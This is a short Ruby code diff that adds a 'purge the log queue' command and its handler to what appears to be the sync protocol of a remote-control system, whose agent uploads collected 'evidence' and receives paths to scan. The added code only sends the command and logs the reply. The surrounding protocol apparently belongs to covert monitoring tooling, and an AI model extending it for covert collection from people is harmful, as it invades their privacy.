@@ -35,6 +35,7 @@ module Command
   PROTO_EVIDENCE      = 0x09       # Upload of an evidence
   PROTO_EVIDENCE_SIZE = 0x0b       # Queue for evidence
   PROTO_FILESYSTEM    = 0x19       # List of paths to be scanned
+  PROTO_PURGE         = 0x1a       # purge the log queue
 
   # the commands are depicted here: http://rcs-dev/trac/wiki/RCS_Sync_Proto_Rest
 
@@ -329,7 +330,23 @@ module Command
     # recurse for the next log to be sent
     send_evidence evidences unless evidences.empty?
   end
-  
+
+  # Protocol Purge
+  # ->  Crypt_K ( PROTO_PURGE )
+  # <-  Crypt_K ( PROTO_NO | PROTO_OK [ time, size ] )
+  def receive_purge
+    trace :info, "PURGE"
+    resp = send_command(PROTO_PURGE)
+
+    # decode the response
+    command, time, size = resp.unpack('I3')
+
+    if command == PROTO_OK
+      trace :info, "PURGE -- [#{Time.at(time)}] #{size} bytes"
+    else
+      trace :info, "PURGE -- No purge for me"
+    end
+  end
   
   # Protocol End
   # ->  Crypt_K ( PROTO_BYE )   
